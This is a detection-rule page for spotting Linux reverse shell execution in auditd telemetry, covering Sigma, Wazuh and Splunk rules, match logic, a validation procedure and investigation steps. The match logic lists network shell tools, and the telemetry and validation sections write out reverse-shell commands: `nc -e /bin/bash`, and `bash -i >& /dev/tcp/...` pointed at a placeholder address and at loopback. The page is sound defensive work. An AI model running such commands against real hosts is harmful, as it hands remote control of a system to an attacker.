# DET-009 — Linux Reverse Shell Execution

| Field | Value |
|---|---|
| Detection ID | DET-009 |
| Rule | Sigma `detections/sigma/linux_reverse_shell.yml`; Wazuh 100001; SPL `detections/splunk/linux_reverse_shell.spl` |
| Data source | Linux auditd EXECVE via Wazuh agent |
| ATT&CK | T1059.004 — Unix Shell |
| Severity | High |
| Status | UNTESTED |

## Logic

Deployed rule 100001 was narrowed in 2026-10: it no longer matches a bare
`nc|socat`; it needs nc/ncat/netcat/socat with an `-e` style flag, or
sh/bash/dash `-i` with `/dev/tcp/` or `>&`. Not validated live (L-001).

(`exe` is bash/sh/dash AND `a1` contains `-i` AND `/dev/tcp/` or `>&` in `a2`/`a3`) OR (`exe` is nc/ncat/netcat/socat AND `-e` in `a1`/`a2`). No aggregation — each match fires.

## Expected telemetry

Auditd EXECVE records showing e.g. `exe=/bin/bash a1=-i a2=>& a3=/dev/tcp/<ip>/<port>/0>&1`, or `exe=/bin/nc a1=-e a2=/bin/bash`.

## Validation method

From the Linux victim, run a benign loopback test: `bash -i >& /dev/tcp/127.0.0.1/4444 0>&1` with a local listener; confirm EXECVE telemetry and the alert. Use loopback only.

## FP notes

Near-zero in production; in the lab, only coordinated exercise traffic. Any unplanned hit is an incident.

## Investigation guidance

1. Extract destination IP/port — attacker infrastructure?
2. Parent process: web shell, exploited service, cron?
3. Full session timeline: what ran after the shell connected?
